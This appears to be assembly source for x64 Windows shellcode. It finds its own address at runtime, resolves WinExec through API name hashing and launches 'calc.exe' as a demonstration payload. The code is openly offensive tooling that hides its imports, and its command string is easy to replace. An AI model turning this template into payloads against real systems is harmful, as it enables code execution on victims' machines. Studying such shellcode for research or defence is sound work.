[ORG 0]
[BITS 64]

entry:
  ; store context
  push rbx                              ; store rbx
  cld                                   ; clear the direction flag

  ; calculate entry address
  call calc_entry_addr                  ; calculate the entry address
  flag_CEA:                             ; flag for calculate entry address

  ; reserve stack for arguments
  sub rsp, 2*8

  ; call "kernel32.dll, WinExec"
  mov rcx, 0x9BAC085EFA4FDFAE           ; set module name hash
  mov rdx, 0x221840B185A6EC3D           ; set procedure name hash
  mov r8,  0xCAF4D6F05577E596           ; set hash key
  mov r9,  2                            ; set num arguments

  lea r10, [rbx+cmd_line]               ; lpCmdLine
  mov [rsp+0], r10                      ; move argument to stack
  xor r10, r10                          ; clear r10
  mov r10b, [rbx+cmd_show]              ; uCmdShow
  mov [rsp+8], r10                      ; move argument to stack

  sub rsp, 32                           ; reserve stack
  call api_call                         ; call api function
  add rsp, 32                           ; restore stack

  ; restore stack for arguments
  add rsp, 2*8

  ; restore context
  pop rbx                               ; restore rbx
  ret                                   ; return to the caller

; calculate shellcode entry address
calc_entry_addr:
  pop rax                               ; get return address
  lea rbx, [rax-flag_CEA]               ; calculate entry address
  push rax                              ; push return address
  ret                                   ; return to entry

hash_api:
  %include "src/x64/api_call.asm"

cmd_line:
  db "calc.exe", 0

cmd_show:
  db 1
